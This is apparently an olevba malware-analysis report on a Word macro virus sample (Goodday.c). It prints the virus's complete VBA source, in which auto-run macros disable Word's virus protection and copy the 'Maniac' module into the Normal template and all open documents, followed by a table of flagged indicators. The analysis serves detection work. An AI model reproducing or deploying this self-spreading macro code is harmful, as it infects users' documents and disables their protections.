olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Goodday.c-5f3d4773be35f7f52e567f40cf8604b735d56b6e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Goodday.c-5f3d4773be35f7f52e567f40cf8604b735d56b6e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Maniac.bas 
in file: Virus.MSWord.Goodday.c-5f3d4773be35f7f52e567f40cf8604b735d56b6e - OLE stream: 'Macros/VBA/Maniac'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "ºêÔÚ 99-05-05 ÓÉ Administrator ´´½¨"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
  
  MacroCopy "open"
  
End Sub
Sub AutoNew()

  MacroCopy "new"
  
End Sub
Sub AutoClose()

  MacroCopy "close"
  
End Sub

Sub MacroCopy(ctype)
    
  Application.Options.VirusProtection = False
  
  TExist = 0
  'For Each xItem In NormalTemplate.VBProject.VBComponents
  For Each xitem In NormalTemplate.VBProject.VBComponents
    'If xitem.Type = vbext_ct_StdModule Then Count = Count + 1
    If xitem.Name = "Maniac" Then TExist = 1
  Next xitem
  If TExist = 0 Then _
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Maniac", Object:=wdOrganizerObjectProjectItems
    
  For Each openDoc In Documents
    'MsgBox openDoc.FullName
    DExist = 0
    For Each xitem In openDoc.VBProject.VBComponents
      If xitem.Name = "Maniac" Then DExist = 1
    Next xitem
    If DExist = 0 Then
      Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=openDoc.FullName, Name:="Maniac", Object:=wdOrganizerObjectProjectItems
      If ctype = "open" Then openDoc.Save
    End If
  Next openDoc
   
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
